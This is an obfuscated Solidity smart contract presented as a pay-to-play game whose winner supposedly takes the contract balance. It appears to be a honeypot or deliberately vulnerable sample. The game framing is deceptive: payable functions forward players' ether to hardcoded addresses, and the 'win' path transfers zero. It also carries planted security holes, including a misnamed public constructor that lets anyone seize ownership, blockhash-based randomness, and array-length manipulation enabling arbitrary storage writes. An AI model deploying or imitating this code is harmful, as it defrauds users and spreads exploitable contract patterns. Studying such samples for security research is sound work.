// winner gets the contract balance
// 0.02 to play

pragma solidity ^0.4.23;

contract FundManager {

//constants

address public _0xc6c4d9 = 0x0;
address public _0xb74bb2;
address public _0x711bf8 = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public _0x8c9584 = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public _0x60f1ca;

mapping(address=>bool) _0x7a520a;

uint256 public _0x2e066c;
uint256[] public _0x346f75 = [951828771,158769871220];
uint256[] public balance;

//constructor

function DranMe() public payable{
	_0xb74bb2 = msg.sender;
}

//modifiers

modifier _0x54f103() {
    require(msg.sender == _0xb74bb2);
    _;
}

modifier _0x153085() {
    require(msg.sender == _0xc6c4d9);
    _;
}

modifier _0x1e6089() {
    require(_0x7a520a[msg.sender]);
    _;
}

//functions

function _0xe8f570() public constant returns(uint256) {
	return _0x346f75.length;
}

function _0x2608d1(uint256 _0x4d3179) public payable _0x54f103{
	_0x2e066c = _0x4d3179;
}

function _0x8cba90() public constant returns(uint256) {
	return _0x60f1ca.length;
}

function _0x1b40bb() public constant returns(uint256) {
	return address(this).balance;
}

function _0xabeae2() public payable{
	require(msg.value >= 0.02 ether);
	_0x60f1ca.push(msg.sender);
	_0x7a520a[msg.sender]=true;
}

function _0x0743c7() public payable _0x1e6089{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=_0xb74bb2 || _0xc459c1()){
	    uint256 _0xb26bc6 = 0;
        msg.sender.transfer(_0xb26bc6);
	}
}

function _0xc459c1() private returns(bool){
    bytes32 _0xc5b8d0 = _0xa47378(blockhash(block.number-1));
    uint256 _0x2e066c = uint256(_0xc5b8d0);
        if(_0x2e066c%5==0){
            _0xc6c4d9 = msg.sender;
            return true;
        }
        else{
            return false;
        }
    }

function _0xde7e18 () public payable _0x1e6089 {
	require (msg.value >= 0.005 ether);
	_0x711bf8.call.value(msg.value)();
}

function _0xe27e9f () public payable _0x1e6089 {
	require (msg.value >= 0.005 ether);
	_0x8c9584.call.value(msg.value)();
}

function _0x6d4b73 (uint256 _0xea0cd5, uint256 _0x20c4ab) public payable _0x1e6089 {
	_0x346f75[_0xea0cd5] = _0x20c4ab;
}

function _0xef0c6c (uint256 _0x28fe5b) public payable _0x1e6089 {
	_0x346f75.length = _0x28fe5b;
}

function _0x67630a (uint256 _0xfc2329) public payable _0x1e6089 returns(uint256) {
	return (_0xfc2329 / (_0x346f75[0]*_0x346f75[1]));
	if((_0xfc2329 / (_0x346f75[0]*_0x346f75[1])) == _0x2e066c) {
		_0xb74bb2 = _0xc6c4d9;
	}
}

function _0xf4c2dc () public payable _0x1e6089 returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == _0x2e066c){
        return true;
    }
}

function _0xfeb6cb() public payable _0x54f103 {
	_0xb74bb2.call.value(1 wei)();
}

function _0x1777be() public payable _0x153085 {
	_0xc6c4d9.transfer(address(this).balance);
}

//fallback function

function() public payable{
	}
}
